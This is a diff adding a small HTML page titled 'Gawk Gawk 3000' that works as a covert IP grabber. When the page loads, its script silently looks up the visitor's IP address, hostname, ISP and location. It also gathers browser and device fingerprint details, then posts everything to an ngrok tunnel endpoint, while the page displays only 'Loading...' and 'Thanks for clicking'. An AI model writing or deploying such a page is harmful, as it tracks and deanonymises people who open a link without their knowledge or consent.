@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Gawkinator</title>
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css" />
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <style>
+      body {
+        background-color: #f2f2f2;
+        font-family: Arial, sans-serif;
+        color: #333;
+      }
+      h1 {
+        color: #0066cc;
+        text-align: left;
+        margin: 20px 0;
+      }
+      h2 {
+        color: #0066cc;
+        text-align: left;
+        margin: 20px 0;
+      }
+      p {
+        font-size: 18px;
+        line-height: 1.5;
+        margin: 20px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Gawk Gawk 3000</h1>
+    
+    <pre><code style="word-wrap: break-word;overflow-wrap: break-word;white-space: pre-wrap;font-size: 16px;background-color: #e7ecf0;">Loading...</code></pre>
+    <script>
+      const timestamp = new Date().toLocaleString();
+      let echolog = {};
+      // here is the fun
+      fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+            timestamp,
+          };
+
+          var codeBlock = document.querySelector("code");
+          codeBlock.innerText = "Thanks for clicking";
+          hljs.highlightAll();
+
+          // Send echolog data to the server
+          fetch('https://4b83-103-119-242-115.ngrok-free.app/log-ip', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ echolog }),
+          })
+            .then(response => response.json())
+            .then(data => {
+              console.log(data); // Log server response if needed
+            })
+            .catch(error => console.error(error));
+        })
+        .catch((error) => console.error(error));
+    </script>
+  </body>
+</html>
